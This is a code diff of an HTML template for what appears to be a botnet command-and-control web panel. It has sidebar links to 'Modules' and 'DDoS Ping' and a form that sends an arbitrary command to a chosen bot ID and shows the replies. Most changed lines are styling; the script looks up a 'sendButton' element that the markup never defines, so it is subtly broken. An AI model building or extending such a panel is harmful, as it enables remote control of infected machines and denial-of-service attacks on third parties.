@@ -1,3 +1,5 @@
+ <!-- Commands.html -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -12,34 +14,39 @@
             left: 0;
             background-color: #4caf50;
             overflow-x: hidden;
-            padding-top: 20px;
+            padding-top: 10px;
             text-align: left;
         }
         .sidebar a {
-            padding: 10px;
+            padding: 3px;
             text-decoration: none;
             font-size: 22px;
             color: white;
             display: flex;
             align-items: center;
+            vertical-align: middle;
         }
         .sidebar img.avatar {
-            width: 30px;
+            width: 25px;
+            align-content: center;
             margin-bottom: 10px;
             margin-right: 10px;
+            vertical-align: middle;
         }
         .sidebar img.logo {
             align-content: center;
-            margin-left: 10px;
-            width: 200px;
-            margin-bottom: 20px;
+            margin-left: 35px;
+            width: 150px;
+            margin-bottom: 10px;
         }
         .sidebar a:hover {
             background-color: #45a049;
         }
         .content {
             margin-left: 240px;
-            padding: 10px;
+            padding: 5px;
+            padding-top: 10px;
+            margin-top: 5px;
         }
         img {
             display: block;
@@ -62,6 +69,8 @@
             display: flex;
             font-family: 'Impact', sans-serif;
             font-size: 20px;
+            margin-left: 240px;
+            margin-top: 10px;
             margin-right: 5px;
             flex-direction: row;
             align-items: center;
@@ -74,7 +83,7 @@
             color: #ffffff;
         }
         .sendcommands input[type="text"] {
-            width: 350px;
+            width: 400px;
             padding: 8px;
             margin: 0 5px;
             border: 1px solid #ccc;
@@ -86,7 +95,10 @@
             background-color: #4caf50;
             color: white;
             border: none;
-            border-radius: 5px;
+            width: 220px;
+            height: 40px;
+            font-size: 16px;
+            border-radius: 7px;
             cursor: pointer;
             transition: background-color 0.3s ease;
             margin: 0 5px;
@@ -96,6 +108,7 @@
         }
         #output {
             margin-top: 20px;
+            margin-left: 230px;
             font-size: 16px;
             color: #fff;
             font-family: Arial, sans-serif;
@@ -104,55 +117,65 @@
 </head>
 <body>
     <div class="sidebar">
-        <img src="{{ url_for('static', filename='img/Lion.png') }}" alt="Logo" class="logo">
-        <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='img/dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
-        <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='img/modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
-        <a class="active" href="#commands"><img src="{{ url_for('static', filename='img/commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
-        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='img/danger_icon.png') }}" alt="DDoS Ping Icon" class="avatar"> DDoS Ping</a>
-        <a href="{{ url_for('logout') }}"><img src="{{ url_for('static', filename='img/logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
+        <img src="{{ url_for('static', filename='Lion.png') }}" alt="Logo" class="logo">
+        <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
+        <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
+        <a href="{{ url_for('commands') }}"><img src="{{ url_for('static', filename='commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
+        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='danger_icon.png') }}" alt="DDoS Ping Icon" class="avatar"> DDoS Ping</a>
+        <a href="{{ url_for('logout') }}"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
-    <div class="content">
-        <form id="commandForm" class="sendcommands">
-            <label for="botId">BOT ID:</label>
-            <input type="text" id="botId" name="botId" required>
-            <label for="command">COMMAND:</label>
-            <input type="text" id="command" name="command" required>
-            <button type="submit">SEND</button>
-        </form>
-        <div id="output"></div>
+    <form id="commandForm" class="sendcommands" onsubmit="sendCommand(); return false;">
+        <label for="idNumber">BOT ID:</label>
+        <input type="text" id="idNumber" name="idNumber" placeholder="Enter BOT-ID" required>
+        <label for="command">COMMAND:</label>
+        <input type="text" id="command" name="command" placeholder="Enter Command" required>
+        <button type="submit">SEND COMMAND</button>
+    </form>
+    <div id="output">
+        <pre id="outputText">{{ commands_output }}</pre>
     </div>
     <script>
-        document.getElementById('commandForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var botId = document.getElementById('botId').value;
+        var commandQueue = [];
+        var requestInProgress = false;
+        function sendCommand() {
+            var idNumber = document.getElementById('idNumber').value;
             var command = document.getElementById('command').value;
-            executeCommand(botId, command);
-        });
-        function executeCommand(botId, command) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/commands', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status === 200) {
-                        var response = JSON.parse(xhr.responseText);
-                        document.getElementById('output').innerText = formatOutput(response.output);
-                    } else {
-                        document.getElementById('output').innerText = 'Error: ' + xhr.responseText;
-                    }
-                }
-            };
-            var data = JSON.stringify({ botId: botId, command: command });
-            xhr.send(data);
-        }
-        function formatOutput(output) {
-            try {
-                let jsonData = JSON.parse(output);
-                return JSON.stringify(jsonData, null, 4);
-            } catch (error) {
-                return output;
+            commandQueue.push({ idNumber: idNumber, command: command });
+            if (!requestInProgress) {
+                sendNextCommand();
             }
         }
-    </script>       
+        function sendNextCommand() {
+            if (commandQueue.length > 0) {
+                var nextCommand = commandQueue.shift();
+                var idNumber = nextCommand.idNumber;
+                var command = nextCommand.command;
+                var button = document.getElementById('sendButton');
+                button.disabled = true;
+                button.innerHTML = 'SENDING COMMAND';
+                var xhr = new XMLHttpRequest();
+                var url = '/commands?idNumber=' + encodeURIComponent(idNumber) + '&command=' + encodeURIComponent(command);
+                xhr.open('GET', url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        button.disabled = false;
+                        button.innerHTML = 'SEND COMMAND';
+                        if (xhr.status === 200) {
+                            var response = JSON.parse(xhr.responseText);
+                            var outputTextElement = document.getElementById('outputText');
+                            outputTextElement.textContent += response.message + '\n';
+                        } else {
+                            alert('ERROR : ' + xhr.responseText);
+                        }
+                        sendNextCommand();
+                    }
+                };
+                xhr.send();
+                requestInProgress = true;
+            } else {
+                requestInProgress = false;
+            }
+        }
+    </script>
 </body>
 </html>
